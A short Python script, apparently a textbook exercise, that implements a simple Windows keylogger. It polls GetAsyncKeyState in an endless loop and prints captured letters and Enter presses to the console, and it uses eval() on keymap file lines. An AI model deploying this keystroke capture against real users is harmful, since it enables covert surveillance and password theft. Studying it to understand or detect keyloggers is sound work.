import win32api
import sys


def getKeys():
    keys = ['Reserved'] * 256
    with open("ch10_keymap.txt") as infile:
        for line in infile:
            i, k = line.split()
            i = eval(i)
            keys[i] = k
    return keys


keys = getKeys()
while True:
    for code in range(8, 256):
        status = win32api.GetAsyncKeyState(code)
        if status & 1 == 0:
            continue
        if code >= 0x41 and code <= 0x5a:
            sys.stdout.write(keys[code][-1].lower())
        elif code == 0x0D:
            sys.stdout.write("\n")
        sys.stdout.flush()
